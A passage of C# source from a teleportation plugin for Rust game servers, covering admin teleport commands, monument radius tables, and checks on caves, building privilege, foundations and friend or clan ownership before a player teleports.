                    user.Reply(_("AdminTPTargetCoordinates", player, targetPlayer.displayName, targetPlayer.transform.position));
                    Puts(_("LogTeleportPlayer", null, player?.displayName, targetPlayer.displayName, targetPlayer.transform.position));
                    break;
                case "teleport.toplayer":
                    if (args.Length < 2)
                    {
                        user.Reply(_("SyntaxConsoleCommandToPlayer", player));
                        return;
                    }
                    players = FindPlayers(args[0], true);
                    if (players.Count <= 0)
                    {
                        user.Reply(_("PlayerNotFound", player));
                        return;
                    }
                    if (players.Count > 1)
                    {
                        user.Reply(_("MultiplePlayers", player, GetMultiplePlayers(players)));
                        return;
                    }
                    var originPlayer = players.First();
                    players = FindPlayers(args[1], true);
                    if (players.Count <= 0)
                    {
                        user.Reply(_("PlayerNotFound", player));
                        return;
                    }
                    if (players.Count > 1)
                    {
                        user.Reply(_("MultiplePlayers", player, GetMultiplePlayers(players)));
                        players.Clear();
                        return;
                    }
                    targetPlayer = players.First();
                    if (targetPlayer == originPlayer)
                    {
                        players.Clear();
                        user.Reply(_("CantTeleportPlayerToSelf", player));
                        return;
                    }
                    players.Clear();
                    Teleport(originPlayer, targetPlayer);
                    user.Reply(_("AdminTPPlayers", player, originPlayer.displayName, targetPlayer.displayName));
                    PrintMsgL(originPlayer, "AdminTPConsoleTPPlayer", targetPlayer.displayName);
                    if (config.Admin.AnnounceTeleportToTarget)
                        PrintMsgL(targetPlayer, "AdminTPConsoleTPPlayerTarget", originPlayer.displayName);
                    Puts(_("LogTeleportPlayer", null, player?.displayName, originPlayer.displayName, targetPlayer.displayName));
                    break;
            }
        }

        private float GetMonumentFloat(string monumentName)
        {
            string name = monumentName.Contains(":") ? monumentName.Substring(0, monumentName.LastIndexOf(":")) : monumentName.TrimEnd();

            switch (name)
            {
                case "Abandoned Cabins":
                    return 54f;
                case "Abandoned Supermarket":
                    return 50f;
                case "Airfield":
                    return 200f;
                case "Barn":
                case "Large Barn":
                    return 75f;
                case "Fishing Village":
                case "Large Fishing Village":
                    return 50f;
                case "Bandit Camp":
                    return 125f;
                case "Junkyard":
                    return 100f;
                case "Giant Excavator Pit":
                    return 225f;
                case "Harbor":
                    return 150f;
                case "HQM Quarry":
                    return 37.5f;
                case "Ice Lake":
                    return 50f;
                case "Large Oil Rig":
                    return 200f;
                case "Launch Site":
                    return 300f;
                case "Lighthouse":
                    return 48f;
                case "Military Tunnel":
                    return 100f;
                case "Mining Outpost":
                    return 45f;
                case "Oil Rig":
                    return 100f;
                case "Outpost":
                    return 250f;
                case "Oxum's Gas Station":
                    return 65f;
                case "Power Plant":
                    return 140f;
                case "power_sub_small_1":
                case "power_sub_small_2":
                case "power_sub_big_1":
                case "power_sub_big_2":
                    return 30f;
                case "Ranch":
                    return 75f;
                case "Satellite Dish":
                    return 90f;
                case "Sewer Branch":
                    return 100f;
                case "Stone Quarry":
                    return 27.5f;
                case "Sulfur Quarry":
                    return 27.5f;
                case "The Dome":
                    return 70f;
                case "Train Yard":
                    return 150f;
                case "Underwater Lab":
                    return 100f;
                case "Water Treatment Plant":
                    return 185f;
                case "Water Well":
                    return 24f;
                case "Wild Swamp":
                    return 24f;
            }

            return config.Settings.DefaultMonumentSize;
        }

        private void CommandSphereMonuments(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !player.IsAdmin || !player.IsConnected || player.IsSleeping()) return;

            //foreach (var monument in  TerrainMeta.Path.Monuments) player.SendConsoleCommand("ddraw.sphere", 30f, Color.blue, monument.transform.position, monument.Bounds.size.Max());

            foreach (var monument in monuments)
            {
                string name = monument.Key.Contains(":") ? monument.Key.Substring(0, monument.Key.LastIndexOf(":")) : monument.Key.TrimEnd();

                player.SendConsoleCommand("ddraw.sphere", 30f, Color.red, monument.Value.Position, GetMonumentFloat(name));
                player.SendConsoleCommand("ddraw.text", 30f, Color.blue, monument.Value.Position, name);
            }

            foreach (var cave in caves)
            {
                string name = cave.Key.Contains(":") ? cave.Key.Substring(0, cave.Key.LastIndexOf(":")) : cave.Key.TrimEnd();
                float realdistance = cave.Key.Contains("Small") ? config.Settings.CaveDistanceSmall : cave.Key.Contains("Medium") ? config.Settings.CaveDistanceMedium : config.Settings.CaveDistanceLarge;
                realdistance += 50f;

                player.SendConsoleCommand("ddraw.sphere", 30f, Color.black, cave.Value, realdistance);
                player.SendConsoleCommand("ddraw.text", 30f, Color.cyan, cave.Value, name);
            }
        }

        private void CommandImportHomes(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;

            if (player != null && (!IsAllowedMsg(player, PermImportHomes) || !player.IsConnected || player.IsSleeping()))
            {
                user.Reply(_("NotAllowed", player));
                return;
            }
            var fileName = string.IsNullOrEmpty(config.Settings.DataFileFolder) ? "m-Teleportation" : $"{config.Settings.DataFileFolder}{Path.DirectorySeparatorChar}m-Teleportation";
            var datafile = Interface.Oxide.DataFileSystem.GetFile(fileName);
            if (!datafile.Exists())
            {
                user.Reply("No m-Teleportation.json exists.");
                return;
            }
            datafile.Load();
            var allHomeData = datafile["HomeData"] as Dictionary<string, object>;
            if (allHomeData == null)
            {
                user.Reply(_("HomeListEmpty", player));
                return;
            }
            var count = 0;
            foreach (var kvp in allHomeData)
            {
                var homeDataOld = kvp.Value as Dictionary<string, object>;
                if (homeDataOld == null) continue;
                if (!homeDataOld.ContainsKey("HomeLocations")) continue;
                var homeList = homeDataOld["HomeLocations"] as Dictionary<string, object>;
                if (homeList == null) continue;
                var userId = Convert.ToUInt64(kvp.Key);
                HomeData homeData;
                if (!_Home.TryGetValue(userId, out homeData))
                    _Home[userId] = homeData = new HomeData();
                foreach (var kvp2 in homeList)
                {
                    var positionData = kvp2.Value as Dictionary<string, object>;
                    if (positionData == null) continue;
                    if (!positionData.ContainsKey("x") || !positionData.ContainsKey("y") || !positionData.ContainsKey("z")) continue;
                    var position = new Vector3(Convert.ToSingle(positionData["x"]), Convert.ToSingle(positionData["y"]), Convert.ToSingle(positionData["z"]));
                    homeData.Locations[kvp2.Key] = position;
                    changedHome = true;
                    count++;
                }
            }
            user.Reply(string.Format("Imported {0} homes.", count));
        }

        private void RequestTimedOut(BasePlayer player, BasePlayer target)
        {
            PlayersRequests.Remove(player.userID);
            PlayersRequests.Remove(target.userID);
            PendingRequests.Remove(target.userID);
            PrintMsgL(player, "TimedOut", target.displayName);
            PrintMsgL(target, "TimedOutTarget", player.displayName);
        }

        #region Util

        private string FormatTime(BasePlayer player, int seconds) // Credits MoNaH
        {
            if (config.Settings.UseSeconds) return $"{seconds} {_("Seconds", player)}";

            TimeSpan _ts = TimeSpan.FromSeconds(seconds);

            _sb.Length = 0;

            if (_ts.TotalDays >= 1)
            {
                _sb.Append($"<color={config.Settings.ChatCommandArgumentColor}>{_ts.Days}</color> {_("Days", player)} ");
            }

            if (_ts.TotalHours >= 1)
            {
                _sb.Append($"<color={config.Settings.ChatCommandArgumentColor}>{_ts.Hours}</color> {_("Hours", player)} ");
            }

            if (_ts.TotalMinutes >= 1)
            {
                _sb.Append($"<color={config.Settings.ChatCommandArgumentColor}>{_ts.Minutes}</color> {_("Minutes", player)} ");
            }

            _sb.Append($"<color={config.Settings.ChatCommandArgumentColor}>{_ts.Seconds}</color> {_("Seconds", player)} ");

            return _sb.ToString();
        }

        private double ConvertToRadians(double angle)
        {
            return System.Math.PI / 180 * angle;
        }
        #endregion

        #region Teleport

        public void Teleport(BasePlayer player, BasePlayer target) => Teleport(player, target.transform.position, true);

        public void Teleport(BasePlayer player, float x, float y, float z) => Teleport(player, new Vector3(x, y, z), true);

        [HookMethod("Teleport")]
        public void Teleport(BasePlayer player, Vector3 newPosition, bool allowTPB)
        {
            if (!player.IsValid() || Vector3.Distance(newPosition, Vector3.zero) < 5f) return;
            if (allowTPB)
            {
                if (config.Settings.TPBTime > 0)
                {
                    Vector3 position = player.transform.position;
                    timer.In(config.Settings.TPBTime, () => SaveLocation(player, position));
                }
                else SaveLocation(player, player.transform.position);
            }

            newPosition.y += 0.1f;

            teleporting[player.userID] = newPosition;

            Subscribe(nameof(OnPlayerViolation));

            var oldPosition = player.transform.position;

            try
            {
                player.UpdateActiveItem(0u); // Prevent weapons when going to safe zone
                player.EnsureDismounted(); // 1.1.2 @Def
                player.Server_CancelGesture();

                if (player.HasParent())
                {
                    player.SetParent(null, true, true);
                }

                if (player.IsConnected) // 1.1.2 @Def
                {
                    player.EndLooting();
                    StartSleeping(player);
                }

                player.RemoveFromTriggers(); // 1.1.2 @Def recommendation to use natural method for issue with triggers
                player.Teleport(newPosition); // 1.1.6

                if (player.IsConnected && !Net.sv.visibility.IsInside(player.net.group, newPosition))
                {
                    player.SetPlayerFlag(BasePlayer.PlayerFlags.ReceivingSnapshot, true);
                    player.ClientRPCPlayer(null, player, "StartLoading");
                    player.SendEntityUpdate();

                    if (!IsInvisible(player)) // fix for becoming networked briefly with vanish while teleporting
                    {
                        player.UpdateNetworkGroup(); // 1.1.1 building fix @ctv
                        player.SendNetworkUpdateImmediate(false);
                    }
                }
            }
            finally
            {
                if (!IsInvisible(player))
                    player.ForceUpdateTriggers(); // 1.1.4 exploit fix for looting sleepers in safe zones
            }

            SetGlobalCooldown(player);

            Interface.CallHook("OnPlayerTeleported", player, oldPosition, newPosition);
        }

        private void OnMapMarkerAdded(BasePlayer player, ProtoBuf.MapNote note)
        {
            if (player.IsAlive() && permission.UserHasPermission(player.UserIDString, PermTpMarker))
            {
                float y = TerrainMeta.HeightMap.GetHeight(note.worldPosition);
                if (player.IsFlying) y = Mathf.Max(y, player.transform.position.y);
                Teleport(player, note.worldPosition + new Vector3(0f, y, 0f), true);
            }
        }

        bool IsInvisible(BasePlayer player)
        {
            return Vanish != null && Convert.ToBoolean(Vanish?.Call("IsInvisible", player));
        }

        public void StartSleeping(BasePlayer player) // custom as to not cancel crafting, or remove player from vanish
        {
            if (!player.IsSleeping())
            {
                Interface.CallHook("OnPlayerSleep", player);
                player.SetPlayerFlag(BasePlayer.PlayerFlags.Sleeping, true);
                player.sleepStartTime = Time.time;
                BasePlayer.sleepingPlayerList.Add(player);
                player.CancelInvoke("InventoryUpdate");
                player.CancelInvoke("TeamUpdate");
            }
        }

        #endregion

        #region Checks
        private string CanPlayerTeleport(BasePlayer player, Vector3 to)
        {
            return Interface.Oxide.CallHook("CanTeleport", player, to) as string;
        }

        private bool CanCraftHome(BasePlayer player)
        {
            return config.Home.AllowCraft || permission.UserHasPermission(player.UserIDString, PermCraftHome);
        }

        private bool CanCraftTPR(BasePlayer player)
        {
            return config.TPR.AllowCraft || permission.UserHasPermission(player.UserIDString, PermCraftTpR);
        }

        public bool AboveWater(BasePlayer player)
        {
            var pos = player.transform.position;
#if DEBUG
            Puts($"Player position: {pos}.  Checking for water...");
#endif
            if ((TerrainMeta.HeightMap.GetHeight(pos) - TerrainMeta.WaterMap.GetHeight(pos)) < 0)
            {
#if DEBUG
                Puts("Player is above water!");
#endif
                return true;
            }
            else
            {
#if DEBUG
                Puts("Player not above water.");
#endif
                return false;
            }
        }

        private string NearMonument(Vector3 target)
        {
            foreach (var entry in monuments)
            {
                if (entry.Key.ToLower().Contains("power_")) continue;
                if (entry.Key.ToLower().Contains("swamp")) continue;
                if (entry.Key.Contains("monument_marker.prefab") && config.Settings.Interrupt.BypassMonumentMarker) continue;

                var pos = entry.Value.Position;
                pos.y = target.y;
                float dist = (target - pos).magnitude;
#if DEBUG
                Puts($"Checking {entry.Key} dist: {dist}, realdistance: {entry.Value.Radius}");
#endif
                if (dist < entry.Value.Radius)
                {
                    if (config.Home.AllowedMonuments.Any(m => entry.Key.Equals(m, StringComparison.OrdinalIgnoreCase)))
                    {
                        return null;
                    }

                    if (config.Settings.Interrupt.Monuments.Count > 0)
                    {
                        if (config.Settings.Interrupt.Monuments.Exists(value => entry.Key.Contains(value, CompareOptions.OrdinalIgnoreCase)))
                        {
#if DEBUG
                            Puts($"Player in range of {entry.Key}");
#endif
                            return entry.Key;
                        }

                        return null;
                    }
#if DEBUG
                    Puts($"Player in range of {entry.Key}");
#endif
                    return entry.Key;
                }
            }

            if (IsMonument(target))
            {
                return "monument";
            }

            return null;
        }

        private bool ContainsTopology(TerrainTopology.Enum mask, Vector3 position)
        {
            return (TerrainMeta.TopologyMap.GetTopology(position) & (int)mask) != 0;
        }

        public bool IsMonument(Vector3 position)
        {
            if (!config.Settings.MonumentTopologyCheck) return false;
            return !ContainsTopology(TerrainTopology.Enum.Building, position) && ContainsTopology(TerrainTopology.Enum.Monument, position);
        }

        public bool IsNearCave(BasePlayer player)
        {
            if (!config.Settings.CaveTopologyCheck) return false;
            return !player.IsOutside() && ContainsTopology(TerrainTopology.Enum.Building | TerrainTopology.Enum.Monument, player.transform.position);
        }

        private bool NearCave(BasePlayer player)
        {
            if (player.IsOutside())
            {
                return false;
            }

            foreach (var entry in caves)
            {
                float realdistance = entry.Key.Contains("Small") ? config.Settings.CaveDistanceSmall : entry.Key.Contains("Medium") ? config.Settings.CaveDistanceMedium : config.Settings.CaveDistanceLarge;

                if (realdistance <= 0)
                {
                    continue;
                }

                if (Vector3.Distance(player.transform.position, entry.Value) < realdistance + 50f)
                {
#if DEBUG
                    Puts("NearCave: {0} nearby.", entry.Key.Contains(":") ? entry.Key.Substring(0, entry.Key.LastIndexOf(":")) : entry.Key);
#endif
                    return true;
                }
                else
                {
#if DEBUG
                    Puts("NearCave: Not near this cave, or above it.");
#endif
                }
            }

            if (IsNearCave(player))
            {
                return true;
            }

            return false;
        }

        private string CheckPlayer(BasePlayer player, bool build = false, bool craft = false, bool origin = true, string mode = "home", bool allowcave = true)
        {
            if (config.Settings.Interrupt.Oilrig || config.Settings.Interrupt.Excavator || config.Settings.Interrupt.Monument || mode == "sethome")
            {
                string monname = NearMonument(player.transform.position);

                if (!string.IsNullOrEmpty(monname))
                {
                    if (mode == "sethome")
                    {
                        if (config.Home.AllowAtAllMonuments || config.Home.AllowedMonuments.Exists(value => monname.Contains(value, CompareOptions.OrdinalIgnoreCase)))
                        {
                            return null;
                        }

                        return "HomeTooCloseToMon";
                    }
                    else
                    {
                        if (config.Settings.Interrupt.Oilrig && monname.Contains("Oil Rig"))
                        {
                            return "TPOilRig";
                        }

                        if (config.Settings.Interrupt.Excavator && monname.Contains("Excavator"))
                        {
                            return "TPExcavator";
                        }

                        if (config.Settings.Interrupt.Monument)
                        {
                            if (config.Home.AllowedMonuments.Exists(value => monname.Contains(value, CompareOptions.OrdinalIgnoreCase)))
                            {
                                return null;
                            }

                            if (monname.Contains(":")) monname = monname.Substring(0, monname.IndexOf(":"));
                            return _("TooCloseToMon", player, monname);
                        }
                    }
                }
            }

#if DEBUG
            Puts($"CheckPlayer(): called mode is {mode}");
#endif
            switch (mode)
            {
                case "tpt":
                    allowcave = config.TPT.AllowCave;
                    break;
                case "home":
                    allowcave = config.Home.AllowCave;
                    break;
                case "tpa":
                case "tpr":
                    allowcave = config.TPR.AllowCave;
                    break;
                default:
#if DEBUG
                    Puts("Skipping cave check...");
#endif
                    break;
            }
            if (!allowcave)
            {
#if DEBUG
                Puts("Checking cave distance...");
#endif
                if (NearCave(player))
                {
                    return "TooCloseToCave";
                }
            }

            if (config.Settings.Interrupt.Hostile && (mode == "bandit" || mode == "outpost" || mode == "town") && player.IsHostile())
            {
                return "TPHostile";
            }

            if (config.Settings.Interrupt.Junkpiles && IsOnJunkPile(player))
            {
                return "TPJunkpile";
            }

            if (config.Settings.Interrupt.Mounted && player.GetMounted() is BaseMountable)
            {
                return "TPMounted";
            }

            if (config.Settings.Interrupt.Boats && player.isMounted && player.GetMounted() is BaseBoat)
            {
                return "TPBoat";
            }

            if (config.Settings.Interrupt.Hurt && origin && player.IsWounded())
            {
                return "TPWounded";
            }

            if (config.Settings.Interrupt.Cold && player.metabolism.temperature.value <= config.Settings.MinimumTemp)
            {
                return "TPTooCold";
            }

            if (config.Settings.Interrupt.Hot && player.metabolism.temperature.value >= config.Settings.MaximumTemp)
            {
                return "TPTooHot";
            }

            if (config.Settings.Interrupt.AboveWater && AboveWater(player))
            {
                return "TPAboveWater";
            }

            if (config.Settings.Interrupt.Swimming && player.IsSwimming())
            {
                return "TPSwimming";
            }

            if (config.Settings.Interrupt.Cargo && player.GetComponentInParent<CargoShip>())
            {
                return "TPCargoShip";
            }

            if (config.Settings.Interrupt.Balloon && player.GetComponentInParent<HotAirBalloon>())
            {
                return "TPHotAirBalloon";
            }

            if (config.Settings.Interrupt.Lift && player.GetComponentInParent<Lift>())
            {
                return "TPBucketLift";
            }

            if (config.Settings.Interrupt.Lift && GetLift(player.transform.position))
            {
                return "TPRegLift";
            }

            if (config.Settings.Interrupt.Safe && player.InSafeZone())
            {
                return "TPSafeZone";
            }

            if (!craft && player.inventory.crafting.queue.Count > 0)
            {
                return "TPCrafting";
            }

            if (player.IsDead())
            {
                return "TPDead";
            }

            if (!build && !player.CanBuild())
            {
                return "TPBuildingBlocked";
            }

            if (config.Settings.BlockZoneFlag && ZoneManager != null)
            {
                var success = ZoneManager?.Call("PlayerHasFlag", player, "notp");

                if (success is bool && (bool)success)
                {
                    return "TPFlagZone";
                }
            }

            if (config.Settings.BlockNoEscape && NoEscape != null)
            {
                if (Convert.ToBoolean(NoEscape?.Call("IsBlocked", player)))
                {
                    return "TPNoEscapeBlocked";
                }
            }

            //if (AntiHack.TestInsideTerrain(player.transform.position + new Vector3(0f, 0.1f, 0f))) return "TPInsideTerrainFrom";

            return null;
        }

        private string CheckTargetLocation(BasePlayer player, Vector3 targetLocation, bool usableIntoBuildingBlocked, bool cupOwnerAllowOnBuildingBlocked)
        {
            //if (AntiHack.TestInsideTerrain(targetLocation + new Vector3(0f, 0.1f, 0f))) return "TPInsideTerrainTo";

            // ubb == UsableIntoBuildingBlocked
            // obb == CupOwnerAllowOnBuildingBlocked
            var entities = Pool.GetList<BuildingBlock>();
            Vis.Entities(targetLocation, 3f, entities, Layers.Mask.Construction, QueryTriggerInteraction.Ignore);
            bool denied = false;

            foreach (var block in entities)
            {
                if (CheckCupboardBlock(block, player, cupOwnerAllowOnBuildingBlocked))
                {
                    denied = false;
#if DEBUG
                    Puts("Cupboard either owned or there is no cupboard");
#endif
                }
                else if (usableIntoBuildingBlocked && player.userID != block.OwnerID)
                {
                    denied = false;
#if DEBUG
                    Puts("Player does not own block, but UsableIntoBuildingBlocked=true");
#endif
                }
                else if (player.userID == block.OwnerID)
                {
#if DEBUG
                    Puts("Player owns block");
#endif

                    if (!player.IsBuildingBlocked(targetLocation, new Quaternion(), block.bounds))
                    {
#if DEBUG
                        Puts("Player not BuildingBlocked. Likely unprotected building.");
#endif
                        denied = false;
                        break;
                    }
                    else if (usableIntoBuildingBlocked)
                    {
#if DEBUG
                        Puts("Player not blocked because UsableIntoBuildingBlocked=true");
#endif
                        denied = false;
                        break;
                    }
                    else
                    {
#if DEBUG
                        Puts("Player owns block but blocked by UsableIntoBuildingBlocked=false");
#endif
                        denied = true;
                        break;
                    }
                }
                else
                {
#if DEBUG
                    Puts("Player blocked");
#endif
                    denied = true;
                    break;
                }
            }
            Pool.FreeList(ref entities);

            return denied ? "TPTargetBuildingBlocked" : null;
        }

        // Check that a building block is owned by/attached to a cupboard, allow tp if not blocked unless allowed by config
        private bool CheckCupboardBlock(BuildingBlock block, BasePlayer player, bool cupOwnerAllowOnBuildingBlocked)
        {
            // obb == CupOwnerAllowOnBuildingBlocked
            var building = block.GetBuilding();
            if (building != null)
            {
#if DEBUG
                Puts("Found building, checking privileges...");
                Puts($"Building ID: {building.ID}");
#endif
                // cupboard overlap.  Check privs.
                if (building.buildingPrivileges == null)
                {
#if DEBUG
                    Puts("No cupboard found, allowing teleport");
#endif
                    return player.CanBuild();
                }

                foreach (var priv in building.buildingPrivileges)
                {
                    if (priv.IsAuthed(player))
                    {
                        // player is authorized to the cupboard
#if DEBUG
                        Puts("Player owns cupboard with auth");
#endif
                        return true;
                    }
                }

                if (player.userID == block.OwnerID)
                {
                    if (cupOwnerAllowOnBuildingBlocked)
                    {
#if DEBUG
                        // player set the cupboard and is allowed in by config
                        Puts("Player owns cupboard with no auth, but allowed by CupOwnerAllowOnBuildingBlocked=true");
#endif
                        return true;
                    }
#if DEBUG
                    // player set the cupboard but is blocked by config
                    Puts("Player owns cupboard with no auth, but blocked by CupOwnerAllowOnBuildingBlocked=false");
#endif
                    return false;
                }

#if DEBUG
                // player not authed
                Puts("Player does not own cupboard and is not authorized");
#endif
                return false;
            }
#if DEBUG
            Puts("No cupboard or building found - we cannot tell the status of this block");
#endif
            return true;
        }

        private string CheckInsideEntity(Vector3 targetLocation)
        {
            var entities = Pool.GetList<BaseEntity>();
            Vis.Entities(targetLocation + new Vector3(0, 0.25f), 0.1f, entities, -1);
            bool inside = entities.Any(e => e is BuildingBlock || e is SimpleBuildingBlock || e is IceFence || e is ElectricBattery || e is Door);
            Pool.FreeList(ref entities);
            return inside ? "TPTargetInsideBlock" : null;
        }

        private string CheckItems(BasePlayer player)
        {
            foreach (var blockedItem in ReverseBlockedItems)
            {
                if (player.inventory.FindItemID(blockedItem.Key) != null)
                {
                    return blockedItem.Value;
                }
            }
            return null;
        }

        private string CheckFoundation(ulong userID, Vector3 position)
        {
            if (permission.UserHasPermission(userID.ToString(), PermFoundationCheck))
            {
                return null;
            }
            if (CheckInsideEntity(position) != null)
            {
                return "HomeNoFoundation";
            }
            if (!config.Home.ForceOnTopOfFoundation) return null; // Foundation/floor not required
            if (UnderneathFoundation(position))
            {
                return "HomeFoundationUnderneathFoundation";
            }

            var entities = new List<BuildingBlock>();
            if (config.Home.AllowAboveFoundation) // Can set on a foundation or floor
            {
#if DEBUG
                Puts($"CheckFoundation() looking for foundation or floor at {position}");
#endif
                entities = GetFoundationOrFloor(position);
            }
            else // Can only use foundation, not floor/ceiling
            {
#if DEBUG
                Puts($"CheckFoundation() looking for foundation at {position}");
#endif
                entities = GetFoundation(position);
            }

            entities.RemoveAll(x => !x.IsValid() || x.IsDestroyed);
            if (entities.Count == 0) return "HomeNoFoundation";

            if (!config.Home.CheckFoundationForOwner) return null;
            for (var i = 0; i < entities.Count; i++)
            {
                if (IsFriend(userID, entities[i].OwnerID)) return null;
            }

            return "HomeFoundationNotFriendsOwned";
        }

        private BuildingBlock GetFoundationOwned(Vector3 position, ulong userID)
        {
#if DEBUG
            Puts("GetFoundationOwned() called...");
#endif
            var entities = GetFoundation(position);
            if (entities.Count == 0) return null;
            if (!config.Home.CheckFoundationForOwner) return entities[0];

            for (var i = 0; i < entities.Count; i++)
            {
                if (IsFriend(userID, entities[i].OwnerID)) return entities[i];
            }
            return null;
        }

        // Borrowed/modified from PreventLooting and Rewards
        // playerid = active player, ownerid = owner of building block, who may be offline
        bool IsFriend(ulong playerid, ulong ownerid)
        {
            if (playerid == ownerid) return true;
            if (config.Home.UseFriends && Friends != null && Friends.IsLoaded)
            {
#if DEBUG
                Puts("Checking Friends...");
#endif
                var fr = Friends?.CallHook("AreFriends", playerid, ownerid);
                if (fr != null && fr is bool && (bool)fr)
                {
#if DEBUG
                    Puts("  IsFriend: true based on Friends plugin");
#endif
                    return true;
                }
            }
            if (config.Home.UseClans && Clans != null && Clans.IsLoaded)
            {
#if DEBUG
                Puts("Checking Clans...");
#endif
                string playerclan = (string)Clans?.CallHook("GetClanOf", playerid);
                string ownerclan = (string)Clans?.CallHook("GetClanOf", ownerid);
                if (playerclan != null && ownerclan != null && playerclan == ownerclan)
                {
#if DEBUG
                    Puts("  IsFriend: true based on Clans plugin");
#endif
                    return true;
                }
            }
            if (config.Home.UseTeams)
            {
#if DEBUG
                Puts("Checking Rust teams...");
#endif
                RelationshipManager.PlayerTeam playerTeam;
                if (RelationshipManager.ServerInstance.playerToTeam.TryGetValue(playerid, out playerTeam))
                {
                    if (playerTeam.members.Contains(ownerid))
                    {
#if DEBUG
                        Puts("  IsFriend: true based on Rust teams");
#endif
                        return true;
                    }
                }
            }
            return false;
        }

        // Check that we are near the middle of a block.  Also check for high wall overlap
        private bool ValidBlock(BaseEntity entity, Vector3 position)
        {
            if (!config.Settings.StrictFoundationCheck)
            {
                return true;
            }
#if DEBUG
            Puts($"ValidBlock() called for {entity.ShortPrefabName}");
#endif
            Vector3 center = entity.CenterPoint();

            List<BaseEntity> ents = new List<BaseEntity>();
            Vis.Entities<BaseEntity>(center, 1.5f, ents);
            foreach (BaseEntity wall in ents)
            {
                if (wall.name.Contains("external.high"))
                {
#if DEBUG
                    Puts($"    Found: {wall.name} @ center {center}, pos {position}");
#endif
                    return false;
                }
            }
#if DEBUG
            Puts($"  Checking block: {entity.name} @ center {center}, pos: {position}");
#endif
            if (entity.PrefabName.Contains("triangle.prefab"))
            {
                if (Math.Abs(center.x - position.x) < 0.5f && Math.Abs(center.z - position.z) < 0.5f)
                {
#if DEBUG
                    Puts($"    Found: {entity.ShortPrefabName} @ center: {center}, pos: {position}");
#endif
                    return true;
                }
            }
            else if (entity.PrefabName.Contains("foundation.prefab") || entity.PrefabName.Contains("floor.prefab"))
            {
                if (Math.Abs(center.x - position.x) < 0.7f && Math.Abs(center.z - position.z) < 0.7f)
                {
#if DEBUG
                    Puts($"    Found: {entity.ShortPrefabName} @ center: {center}, pos: {position}");
#endif
                    return true;
                }
            }

            return false;
        }

        private List<BuildingBlock> GetFoundation(Vector3 position)
        {
            RaycastHit hit;
            var entities = new List<BuildingBlock>();

            if (Physics.Raycast(position + new Vector3(0f, 0.2f, 0f), Vector3.down, out hit, 3f, Layers.Mask.Construction))
            {
                var entity = hit.GetEntity();

                if (entity.IsValid())
                {
                    if (entity.PrefabName.Contains("foundation") || position.y < entity.WorldSpaceBounds().ToBounds().max.y)
                    {
                        if (ValidBlock(entity, position))
                        {
#if DEBUG
                            Puts($"  GetFoundation() found {entity.PrefabName} at {entity.transform.position}");
#endif
                            entities.Add(entity as BuildingBlock);
                        }
                    }
                }
            }
#if DEBUG            
            if (entities.Count == 0)
            {
                Puts("  GetFoundation() none found.");
            }
#endif
            return entities;
        }

        private List<BuildingBlock> GetFloor(Vector3 position)
        {
            RaycastHit hitinfo;
            var entities = new List<BuildingBlock>();

            if (Physics.Raycast(position, Vector3.down, out hitinfo, 3f, Layers.Mask.Construction, QueryTriggerInteraction.Ignore) && hitinfo.GetEntity().IsValid())
            {
                var entity = hitinfo.GetEntity();

                if (entity.IsValid() && entity.PrefabName.Contains("floor"))
                {
#if DEBUG
                    Puts($"  GetFloor() found {entity.PrefabName} at {entity.transform.position}");
#endif
                    entities.Add(entity as BuildingBlock);
                }
            }
            else
            {
#if DEBUG
                Puts("  GetFloor() none found.");
#endif
            }

            return entities;
        }

        private List<BuildingBlock> GetFoundationOrFloor(Vector3 position)
        {
            RaycastHit hitinfo;
            var entities = new List<BuildingBlock>();

            if (Physics.Raycast(position + new Vector3(0f, 0.2f, 0f), Vector3.down, out hitinfo, 3f, Layers.Mask.Construction) && hitinfo.GetEntity().IsValid())
            {
                var entity = hitinfo.GetEntity();
                if (entity.PrefabName.Contains("floor") || entity.PrefabName.Contains("foundation"))// || position.y < entity.WorldSpaceBounds().ToBounds().max.y))
                {
#if DEBUG
                    Puts($"  GetFoundationOrFloor() found {entity.PrefabName} at {entity.transform.position}");
#endif
                    if (ValidBlock(entity, position))
                    {
                        entities.Add(entity as BuildingBlock);
                    }
                }
            }
            else
            {
#if DEBUG
                Puts("  GetFoundationOrFloor() none found.");
#endif
            }

            return entities;
        }

        private bool CheckBoundaries(float x, float y, float z)
        {
            return x <= boundary && x >= -boundary && y <= 2000 && y >= -100 && z <= boundary && z >= -boundary;
        }

        private Vector3 GetGround(Vector3 sourcePos)
        {
            if (!config.Home.AllowAboveFoundation) return sourcePos;
            var newPos = sourcePos;
            newPos.y = TerrainMeta.HeightMap.GetHeight(newPos);
            sourcePos.y += .5f;
            RaycastHit hitinfo;
            var done = false;

#if DEBUG
            Puts("GetGround(): Looking for iceberg or cave");
#endif
            //if (Physics.SphereCast(sourcePos, .1f, Vector3.down, out hitinfo, 250, groundLayer))
            if (Physics.Raycast(sourcePos, Vector3.down, out hitinfo, 250f, Layers.Mask.Terrain | Layers.Mask.World))
            {
                if ((config.Home.AllowIceberg && hitinfo.collider.name.Contains("iceberg")) || (config.Home.AllowCave && hitinfo.collider.name.Contains("cave_")))
                {
#if DEBUG
                    Puts("GetGround():   found iceberg or cave");
#endif
                    sourcePos.y = hitinfo.point.y;
                    done = true;
                }
                else
                {
                    var mesh = hitinfo.collider.GetComponentInChildren<MeshCollider>();
                    if (mesh != null && mesh.sharedMesh.name.Contains("rock_"))
                    {
                        sourcePos.y = hitinfo.point.y;
                        done = true;
                    }
                }
            }
#if DEBUG
            Puts("GetGround(): Looking for cave or rock");
#endif
            //if (!_config.Home.AllowCave && Physics.SphereCast(sourcePos, .1f, up, out hitinfo, 250, Layers.Mask.Terrain | Layers.Mask.World) && hitinfo.collider.name.Contains("rock_"))
            if (!config.Home.AllowCave && Physics.Raycast(sourcePos, Vector3.up, out hitinfo, 250f, Layers.Mask.Terrain | Layers.Mask.World) && hitinfo.collider.name.Contains("rock_"))
            {
#if DEBUG
                Puts("GetGround():   found cave or rock");
#endif
                sourcePos.y = newPos.y - 10;
                done = true;
            }
            return done ? sourcePos : newPos;
        }

        private bool GetLift(Vector3 position)
        {
            List<ProceduralLift> nearObjectsOfType = new List<ProceduralLift>();
            Vis.Entities<ProceduralLift>(position, 0.5f, nearObjectsOfType);
            if (nearObjectsOfType.Count > 0)
            {
                return true;
            }
            return false;
        }

        private bool IsOnJunkPile(BasePlayer player)
        {
